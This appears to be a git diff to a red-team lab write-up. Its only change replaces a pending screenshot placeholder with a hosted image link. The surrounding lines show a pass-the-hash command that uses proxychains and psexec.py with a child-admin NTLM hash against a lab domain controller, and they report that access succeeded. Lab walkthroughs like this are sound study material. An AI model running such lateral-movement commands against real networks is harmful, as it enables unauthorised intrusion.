@@ -385,7 +385,7 @@ Using the psexec.py, the child-admin hash and with our active proxy running on 1
 ```bash
 proxychains psexec.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
 ```
-![Uploading Screenshot 2023-07-08 at 8.07.11 PM.png…]()
+![Screenshot 2023-07-08 at 8 07 11 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/79cdd815-38a6-439e-b2d1-6923dedab8bf)
 
 There, I got successfully accessed it. 
 
